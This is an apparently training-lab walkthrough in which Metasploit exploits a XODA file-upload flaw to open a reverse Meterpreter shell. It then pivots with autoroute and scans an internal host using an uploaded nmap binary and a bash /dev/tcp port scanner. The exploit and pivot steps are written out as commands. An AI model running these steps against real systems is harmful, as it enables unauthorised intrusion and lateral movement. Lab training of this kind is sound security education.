# T1046: Network Service Scanning (Full Lab Walkthrough)

This lab demonstrates how to use Metasploit and various tools to discover and scan services running on a second target machine via a compromised host.

## Step-by-Step Instructions

### ðŸŸ¢ Step 1: Access the Kali Machine
Open the lab environment to access the pre-configured Kali Linux machine.

---

### ðŸŸ¢ Step 2: Check Connectivity to the Target
Use `ping` to check if the first target is reachable.
```bash
ping -c 4 demo1.ine.local
```

---

### ðŸŸ¢ Step 3: Port Scan with Nmap
Scan the first target to find open ports.
```bash
nmap demo1.ine.local
```
âœ… Port 80 is open.

---

### ðŸŸ¢ Step 4: Check Web Content
Use `curl` to inspect the content of port 80.
```bash
curl demo1.ine.local
```
âœ… XODA web app is detected.

---

### ðŸŸ¢ Step 5: Start Metasploit
```bash
msfconsole
```

---

### ðŸŸ¢ Step 6: Exploit XODA Vulnerability
Use the Metasploit module to gain access.
```bash
use exploit/unix/webapp/xoda_file_upload
set RHOSTS demo1.ine.local
set TARGETURI /
set LHOST 192.63.4.2
exploit
```
âœ… Meterpreter session opened.

---

### ðŸŸ¢ Step 7: Discover Internal IP Range
Run the following in Meterpreter to find the second subnet:
```bash
shell
ip addr
```
âœ… Discovered subnet: `192.180.108.0/24`

---

### ðŸŸ¢ Step 8: Add Route to New Subnet
```bash
run autoroute -s 192.180.108.2
```

---

### ðŸŸ¢ Step 9: Scan the Second Target
Background the Meterpreter session (CTRL+Z + Y) and run a TCP port scan:
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.180.108.3
set verbose false
set ports 1-1000
exploit
```
âœ… Open ports: 21, 22, 80

---

### ðŸŸ¢ Step 10: Check for Nmap Static Binary
```bash
ls -al /root/static-binaries/nmap
file /root/static-binaries/nmap
```

---

### ðŸŸ¢ Step 11: Create Bash Port Scanner Script
Create a file called `bash-port-scanner.sh` with this content:
```bash
#!/bin/bash
for port in {1..1000}; do
  timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done
```

---

### ðŸŸ¢ Step 12: Reopen Meterpreter Session
```bash
sessions -i 1
```

---

### ðŸŸ¢ Step 13: Upload Tools to Target
```bash
upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
```

---

### ðŸŸ¢ Step 14: Run Bash Script on Target
```bash
shell
cd /tmp
chmod +x ./nmap ./bash-port-scanner.sh
./bash-port-scanner.sh 192.180.108.3
```

---

### ðŸŸ¢ Step 15: Run Nmap from Target
```bash
./nmap -p- 192.180.108.3
```
âœ… Ports open: FTP (21), SSH (22), HTTP (80)

---

## Summary

In this lab, we:
- Scanned an external target
- Exploited a vulnerable web app to gain access
- Used autoroute to pivot into an internal network
- Scanned a second host using both a custom script and Nmap
